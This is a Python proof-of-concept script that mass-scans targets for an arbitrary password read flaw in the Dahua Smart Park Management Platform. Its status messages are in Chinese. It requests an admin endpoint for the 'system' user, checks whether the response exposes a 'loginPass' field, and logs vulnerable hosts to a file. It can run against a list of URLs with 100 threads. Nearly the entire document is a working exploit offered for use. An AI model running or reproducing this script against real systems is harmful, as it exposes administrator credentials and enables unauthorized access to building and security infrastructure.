import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """

▓█████▄  ▄▄▄       ██░ ██  █    ██  ▄▄▄      
▒██▀ ██▌▒████▄    ▓██░ ██▒ ██  ▓██▒▒████▄    
░██   █▌▒██  ▀█▄  ▒██▀▀██░▓██  ▒██░▒██  ▀█▄  
░▓█▄   ▌░██▄▄▄▄██ ░▓█ ░██ ▓▓█  ░██░░██▄▄▄▄██ 
░▒████▓  ▓█   ▓██▒░▓█▒░██▓▒▒█████▓  ▓█   ▓██▒
 ▒▒▓  ▒  ▒▒   ▓▒█░ ▒ ░░▒░▒░▒▓▒ ▒ ▒  ▒▒   ▓▒█░
 ░ ▒  ▒   ▒   ▒▒ ░ ▒ ░▒░ ░░░▒░ ░ ░   ▒   ▒▒ ░
 ░ ░  ░   ░   ▒    ░  ░░ ░ ░░░ ░ ░   ░   ▒   
   ░          ░  ░ ░  ░  ░   ░           ░  ░
 ░                                                    
"""
    print(test)

def poc(target):
    payload = '/admin/user_getUserInfoByUserName.action?userName=system'

    try:
        res1 = requests.get(url=target+payload,verify=False)
        if res1.status_code == 200 and 'loginPass' in res1.text:
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'{target}\n')
                print(f"[+]该{target}存在任意密码读取漏洞")
        else:
                print(f"[-]该{target}不存在任意密码读取漏洞")
    except Exception as e:
        print(f'[+]该url存在问题{target}，请手动注入')


def main():

    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="大华智慧园区管理平台任意密码读取")

    parse.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parse.add_argument("-f","--file",dest="file",type=str,help="Please enter file")

    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url.replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()